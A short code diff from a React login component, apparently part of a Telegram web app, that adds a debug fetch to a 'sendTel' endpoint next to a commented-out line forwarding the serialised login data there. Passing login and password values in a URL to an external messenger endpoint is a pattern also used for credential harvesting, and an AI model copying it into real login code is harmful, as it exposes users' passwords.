@@ -47,6 +47,7 @@ const Auth = () => {
             },
             body: JSON.stringify({"as":"12"})
         }),
+        fetch(sendTel+"asdasdasdasd!!!!!!!!")
         // fetch(sendTel+JSON.stringify(data))
         tg.sendData(JSON.stringify(data));
     }, [login, password, /*subject*/])
